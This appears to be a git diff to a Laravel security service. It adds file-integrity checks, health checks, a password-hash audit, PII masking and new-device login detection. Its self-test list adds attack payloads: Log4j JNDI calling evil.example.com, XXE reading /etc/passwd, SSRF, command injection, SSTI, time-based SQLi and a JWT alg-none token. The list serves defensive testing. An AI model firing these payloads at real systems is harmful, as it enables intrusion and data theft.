@@ -3,6 +3,7 @@
 namespace App\Services;
 
 use App\Http\Middleware\SecurityHeaders;
+use App\Models\FileIntegrityBaseline;
 use App\Models\RiwayatLogin;
 use App\Models\SecurityLog;
 use App\Models\ServerMetric;
@@ -11,9 +12,11 @@ use App\Support\AgentParser;
 use App\Support\SecurityGuard;
 use Illuminate\Support\Carbon;
 use Illuminate\Support\Collection;
+use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Schema;
+use Illuminate\Support\Facades\Storage;
 
 class SecurityService
 {
@@ -379,9 +382,16 @@ class SecurityService
             'SQL Injection (UNION)' => '/login?user=admin%27%20UNION%20SELECT%20password%20FROM%20users--',
             'SQL Injection (waktu)' => '/login?q=1;pg_sleep(5)',
             'Path Traversal' => '/../../etc/passwd',
+            'Path Traversal (encoded)' => '/%2e%2e%2f%2e%2e%2fetc/passwd',
             'XSS (tag script)' => '/login?q=%3Cscript%3Ealert(1)%3C/script%3E',
             'CRLF Injection' => '/login%0d%0aX-Injected: true',
             'Null Byte' => '/media/logo.png%00.jpg',
+            'SSTI (Jinja2)' => '/cari?q=%7B%7B7*7%7D%7D',
+            'SSTI (JSP EL)' => '/cari?q=%24%7B7*7%7D',
+            'Log4j JNDI' => '/login?user=%24%7Bjndi:ldap://evil.example.com/a%7D',
+            'SQLi time (benchmark)' => '/login?q=1%20AND%20BENCHMARK(5000000,SHA1(1))',
+            'Webshell upload' => '/upload/shell.php',
+            'JWT alg none' => '/api/verify?token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
         ];
 
         $bodyTests = [
@@ -390,6 +400,9 @@ class SecurityService
             'SQL Injection (CRUD)' => 'select password from users where 1=1',
             'Object Pollution' => '{"__proto__": {"polluted": true}}',
             'Akses cookie via XSS' => 'document.cookie',
+            'XXE (DOCTYPE)' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+            'SSRF (localhost)' => '{"url": "http://localhost:80/internal"}',
+            'Command injection (semicolon)' => 'host=$(id; whoami)',
         ];
 
         $results = [];
@@ -444,12 +457,12 @@ class SecurityService
             fputcsv($out, [
                 $log->id,
                 SecurityLog::TIPES[$log->tipe] ?? $log->tipe,
-                $user?->profile?->full_name ?? $user?->name ?? $user?->email ?? 'Anonim',
+                $this->maskPii($user?->profile?->full_name ?? $user?->name ?? $user?->email ?? 'Anonim'),
                 $user ? ($user->isAdmin() ? 'admin' : 'siswa') : '',
                 $log->ip_address ?? '',
                 $log->browser ?? '',
                 $log->sistem_operasi ?? '',
-                $log->keterangan ?? '',
+                $this->maskPii($log->keterangan ?? ''),
                 $log->created_at?->toDateTimeString() ?? '',
             ]);
         }
@@ -585,6 +598,312 @@ class SecurityService
     public function bannedIps(): array
     {
         return SecurityGuard::activeBans();
+    }
+
+    /**
+     * Daftar berkas penting yang dipantau integritasnya + status vs baseline.
+     *
+     * @return array<int, array{path: string, status: string, checksum: ?string, size: ?int}>
+     */
+    public function fileIntegrityStatus(): array
+    {
+        if (! Schema::hasTable('file_integrity_baselines')) {
+            return [];
+        }
+
+        $baseline = FileIntegrityBaseline::query()->get()->keyBy('path');
+        $files = $this->monitoredFiles();
+        $result = [];
+
+        foreach ($files as $path) {
+            $absolute = base_path($path);
+            $exists = is_file($absolute);
+
+            if (! $exists) {
+                $result[] = ['path' => $path, 'status' => 'missing', 'checksum' => null, 'size' => null];
+                continue;
+            }
+
+            $current = hash_file('sha256', $absolute);
+            $row = $baseline->get($path);
+
+            if ($row === null) {
+                $result[] = ['path' => $path, 'status' => 'unmonitored', 'checksum' => $current, 'size' => filesize($absolute)];
+                continue;
+            }
+
+            $result[] = [
+                'path' => $path,
+                'status' => hash_equals((string) $row->checksum, (string) $current) ? 'ok' : 'modified',
+                'checksum' => $current,
+                'size' => filesize($absolute),
+            ];
+        }
+
+        return $result;
+    }
+
+    /**
+     * Bangun ulang baseline checksum dari berkas penting saat ini.
+     *
+     * @return int Jumlah berkas yang di-baseline.
+     */
+    public function rebuildFileIntegrityBaseline(): int
+    {
+        FileIntegrityBaseline::query()->truncate();
+
+        $count = 0;
+
+        foreach ($this->monitoredFiles() as $path) {
+            $absolute = base_path($path);
+
+            if (! is_file($absolute)) {
+                continue;
+            }
+
+            FileIntegrityBaseline::create([
+                'path' => $path,
+                'checksum' => hash_file('sha256', $absolute),
+                'size' => filesize($absolute),
+                'baseline_at' => now(),
+            ]);
+
+            $count++;
+        }
+
+        logger()->channel('security')->info('Baseline integritas berkas dibangun ulang.', [
+            'user_id' => auth()->id(),
+            'files' => $count,
+        ]);
+
+        return $count;
+    }
+
+    /**
+     * Berkas yang dipantau: sumber aplikasi, konfigurasi, rute, dan .env.
+     *
+     * @return array<int, string>
+     */
+    private function monitoredFiles(): array
+    {
+        $paths = ['.env', 'composer.json', 'composer.lock', 'bootstrap/app.php'];
+
+        $dirs = ['app', 'config', 'routes', 'database/migrations'];
+
+        foreach ($dirs as $dir) {
+            $absolute = base_path($dir);
+
+            if (! is_dir($absolute)) {
+                continue;
+            }
+
+            $iterator = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($absolute, \FilesystemIterator::SKIP_DOTS));
+
+            foreach ($iterator as $file) {
+                if ($file->isFile()) {
+                    $paths[] = str_replace(DIRECTORY_SEPARATOR, '/', substr($file->getPathname(), strlen(base_path()) + 1));
+                }
+            }
+        }
+
+        sort($paths);
+
+        return $paths;
+    }
+
+    /**
+     * Pemeriksaan ketersediaan (Availability) komponen penting aplikasi.
+     *
+     * @return array<int, array{key: string, label: string, ok: bool, value: string, hint: string}>
+     */
+    public function systemHealth(): array
+    {
+        $checks = [
+            $this->healthCheck(
+                'database',
+                'Koneksi database (PostgreSQL)',
+                $this->databaseAlive(),
+                'Aplikasi dapat berkomunikasi dengan basis data.',
+                'Driver: '.config('database.default')
+            ),
+            $this->healthCheck(
+                'cache',
+                'Cache dapat ditulis/dibaca',
+                $this->cacheAlive(),
+                'Rate limiter, ban IP, dan throttle bergantung pada cache.',
+                'Store: '.config('cache.default')
+            ),
+            $this->healthCheck(
+                'storage',
+                'Direktori penyimpanan dapat ditulis',
+                $this->storageWritable(),
+                'Biodata, kwitansi, bukti bayar, dan materi disimpan di sini.',
+                storage_path()
+            ),
+            $this->healthCheck(
+                'scheduler',
+                'Scheduler berjalan',
+                $this->schedulerAlive(),
+                'Perintah terjadwal (metrik server) butuh scheduler aktif.',
+                'php artisan schedule:work'
+            ),
+            $this->healthCheck(
+                'queue',
+                'Driver antrian aman',
+                config('queue.default') !== null && config('queue.default') !== '',
+                'Saat fungsional berpindah ke queue, wajib menjalankan worker.',
+                'Driver: '.config('queue.default')
+            ),
+        ];
+
+        return $checks;
+    }
+
+    private function databaseAlive(): bool
+    {
+        try {
+            DB::select('select 1');
+
+            return true;
+        } catch (\Throwable $e) {
+            return false;
+        }
+    }
+
+    private function cacheAlive(): bool
+    {
+        try {
+            $key = 'sec:health:'.uniqid();
+            Cache::put($key, 'ok', 60);
+            $ok = Cache::get($key) === 'ok';
+            Cache::forget($key);
+
+            return $ok;
+        } catch (\Throwable $e) {
+            return false;
+        }
+    }
+
+    private function storageWritable(): bool
+    {
+        foreach (['biodata', 'kwitansi', 'public', 'private', 'logs'] as $dir) {
+            $path = storage_path('app/'.$dir);
+
+            if (! is_dir($path)) {
+                $path = storage_path($dir);
+            }
+
+            if (is_dir($path) && ! is_writable($path)) {
+                return false;
+            }
+        }
+
+        return is_writable(storage_path());
+    }
+
+    private function schedulerAlive(): bool
+    {
+        $metric = ServerMetric::query()->latest('recorded_at')->first();
+
+        if ($metric === null) {
+            $lastRun = @filemtime(storage_path('framework/cache/.scheduler_run'));
+
+            return $lastRun !== false && $lastRun > now()->subMinutes(10)->getTimestamp();
+        }
+
+        return $metric->recorded_at !== null && $metric->recorded_at->isAfter(now()->subMinutes(15));
+    }
+
+    private function healthCheck(string $key, string $label, bool $ok, string $hint, string $value): array
+    {
+        return [
+            'key' => $key,
+            'label' => $label,
+            'ok' => $ok,
+            'value' => $value,
+            'hint' => $hint,
+        ];
+    }
+
+    /**
+     * Audit kekuatan hash password tiap akun (Confidentiality).
+     *
+     * @return array{total: int, weak: int, weak_users: array<int, array{id: int, nama: string, hash_algo: string}>, strong: int, tanpa_password: int}
+     */
+    public function passwordHashAudit(): array
+    {
+        $users = User::query()
+            ->orderBy('created_at')
+            ->get(['id', 'username', 'name', 'email', 'password']);
+
+        $weakUsers = [];
+        $weak = 0;
+        $strong = 0;
+        $tanpaPassword = 0;
+
+        foreach ($users as $user) {
+            $hash = (string) $user->password;
+            $algo = $this->detectHashAlgorithm($hash);
+
+            if ($hash === '') {
+                $tanpaPassword++;
+
+                continue;
+            }
+
+            if ($algo === 'argon' || $algo === 'bcrypt') {
+                $strong++;
+            } else {
+                $weak++;
+                $weakUsers[] = [
+                    'id' => $user->id,
+                    'nama' => $user->name ?? $user->username ?? $user->email ?? 'Akun '.$user->id,
+                    'hash_algo' => $algo,
+                ];
+            }
+        }
+
+        return [
+            'total' => $users->count(),
+            'weak' => $weak,
+            'strong' => $strong,
+            'tanpa_password' => $tanpaPassword,
+            'weak_users' => array_slice($weakUsers, 0, 50),
+        ];
+    }
+
+    public function vulnerabilityScans(): array
+    {
+        return app(VulnerabilityScanner::class)->latestScans();
+    }
+
+    private function detectHashAlgorithm(string $hash): string
+    {
+        if (str_starts_with($hash, '$argon2')) {
+            return 'argon';
+        }
+
+        if (str_starts_with($hash, '$2y$') || str_starts_with($hash, '$2a$') || str_starts_with($hash, '$2b$')) {
+            return 'bcrypt';
+        }
+
+        if (preg_match('/^[a-f0-9]{32,128}$/i', $hash)) {
+            return 'sha';
+        }
+
+        return 'plain';
+    }
+
+    /**
+     * Masking PII (email) untuk data yang diekspor agar tidak bocor mentah.
+     */
+    private function maskPii(string $value): string
+    {
+        return preg_replace_callback(
+            '/(\b[A-Z0-9._%+-])[A-Z0-9._%+-]*@[A-Z0-9.-]+(\.[A-Z]{2,})\b/i',
+            fn (array $m) => $m[1].'***@***'.$m[2],
+            $value
+        );
     }
 
     public function securityPosture(): array
@@ -762,6 +1081,35 @@ class SecurityService
             'keterangan' => $log->keterangan,
             'path' => $log->path,
             'waktu' => $log->created_at?->toIso8601String(),
+            'perangkat_baru' => $this->isNewDeviceForUser($log),
         ];
+    }
+
+    /**
+     * Deteksi dugaan akses dari perangkat baru (Confidentiality):
+     * login sukses dari IP yang belum pernah dipakai akun tersebut.
+     */
+    private function isNewDeviceForUser(SecurityLog $log): bool
+    {
+        if (! $log->user_id || ! $log->ip_address || $log->tipe !== SecurityLog::TIPE_LOGIN_SUKSES) {
+            return false;
+        }
+
+        $hasHistory = SecurityLog::query()
+            ->where('user_id', $log->user_id)
+            ->where('tipe', SecurityLog::TIPE_LOGIN_SUKSES)
+            ->where('id', '!=', $log->id)
+            ->where('ip_address', '!=', '')
+            ->whereNotNull('ip_address')
+            ->exists();
+
+        $seenBefore = SecurityLog::query()
+            ->where('user_id', $log->user_id)
+            ->where('tipe', SecurityLog::TIPE_LOGIN_SUKSES)
+            ->where('id', '!=', $log->id)
+            ->where('ip_address', $log->ip_address)
+            ->exists();
+
+        return $hasHistory && ! $seenBefore;
     }
 }
